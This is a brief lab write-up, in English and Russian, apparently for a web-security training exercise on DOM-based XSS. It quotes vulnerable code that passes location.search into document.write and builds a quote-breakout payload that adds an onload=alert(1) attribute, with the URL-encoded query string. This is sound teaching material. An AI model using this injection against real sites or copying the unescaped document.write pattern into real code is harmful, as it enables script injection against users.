# DOM XSS in document.write sink using source location.search
APPRENTICE

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.

## Решение
В исходниках страницы обнаружен следующий код:
```
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```
Чтобы выйти из контекста значения тэга src добавлю двойную кавычку, а затем добавлю атрибут onload со значением `alert(1)`. Для красоты, чтобы HTML был корректен, добавлю новый атрибут, но не буду закрывать двойную кавычку его строкового значения: `test" onload=alert(1) x-catpants="123`

`/?search=test"+onload%3Dalert%281%29+x-catpants%3D"123`

Задание выполнено.
